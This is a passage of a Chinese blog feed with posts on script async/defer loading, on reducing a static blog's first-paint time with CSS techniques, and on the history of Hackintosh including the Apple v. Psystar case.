会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 